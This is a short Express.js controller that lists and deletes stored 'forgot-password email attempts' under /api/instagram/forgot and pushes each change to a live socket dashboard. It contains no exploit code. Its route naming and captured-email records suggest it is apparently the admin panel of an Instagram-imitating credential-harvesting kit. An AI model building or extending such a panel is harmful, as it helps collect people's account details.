const ForgotEmail = require('../models/ForgotEmail.model');
const { getIo }   = require('../config/socket');
const { sendSuccess, sendFailure } = require('../utils/response');

/* ── Format helper ── */
const fmt = (doc) => ({
  id:        doc._id.toString(),
  email:     doc.email,
  verified:  doc.verified,
  at:        doc.createdAt.toISOString(),
});

/**
 * GET /api/instagram/forgot
 * Return all forgot-password email attempts, newest first.
 */
const getAllForgot = async (req, res) => {
  try {
    const docs = await ForgotEmail.find().sort({ createdAt: -1 });
    return sendSuccess(res, 'Forgot emails retrieved', { forgotEmails: docs.map(fmt) });
  } catch (err) {
    return sendFailure(res, err.message || 'Internal Server Error', 500);
  }
};

/**
 * DELETE /api/instagram/forgot/all
 * Clear every forgot-password record.
 */
const deleteAllForgot = async (req, res) => {
  try {
    const result = await ForgotEmail.deleteMany({});
    const io = getIo();
    if (io) io.emit('forgotEmailsCleared');
    return sendSuccess(res, `${result.deletedCount} record(s) deleted`);
  } catch (err) {
    return sendFailure(res, err.message || 'Internal Server Error', 500);
  }
};

/**
 * DELETE /api/instagram/forgot/:id
 * Delete a single record.
 */
const deleteForgot = async (req, res) => {
  try {
    const { id } = req.params;
    const doc = await ForgotEmail.findByIdAndDelete(id);
    if (!doc) return sendFailure(res, 'Record not found', 404);
    const io = getIo();
    if (io) io.emit('forgotEmailDeleted', { id });
    return sendSuccess(res, 'Record deleted');
  } catch (err) {
    return sendFailure(res, err.message || 'Internal Server Error', 500);
  }
};

/**
 * DELETE /api/instagram/forgot  (body: { ids: [...] })
 * Bulk delete.
 */
const deleteForgotBulk = async (req, res) => {
  try {
    const { ids } = req.body;
    if (!Array.isArray(ids) || ids.length === 0)
      return sendFailure(res, 'ids array is required', 400);
    await ForgotEmail.deleteMany({ _id: { $in: ids } });
    const io = getIo();
    if (io) io.emit('forgotEmailsDeleted', { ids });
    return sendSuccess(res, `${ids.length} record(s) deleted`);
  } catch (err) {
    return sendFailure(res, err.message || 'Internal Server Error', 500);
  }
};

module.exports = { getAllForgot, deleteAllForgot, deleteForgot, deleteForgotBulk, fmt };
